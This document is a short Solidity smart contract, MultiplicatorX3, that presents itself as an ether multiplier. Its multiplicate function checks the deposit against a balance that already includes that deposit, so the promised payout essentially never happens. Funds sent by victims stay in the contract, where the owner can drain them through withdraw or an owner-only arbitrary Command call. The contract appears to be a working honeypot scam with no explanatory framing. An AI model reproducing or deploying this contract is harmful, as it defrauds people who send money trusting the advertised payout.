pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner;
   
    function MultiplicatorX3() public {
        Owner = retrieveOwner();
    }

    function retrieveOwner() internal view returns (address) {
        return msg.sender;
    }
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == getOwner());
        getOwner().transfer(this.balance);
    }
    
    function getOwner() internal view returns (address) {
        return Owner;
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == getOwner());
         
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}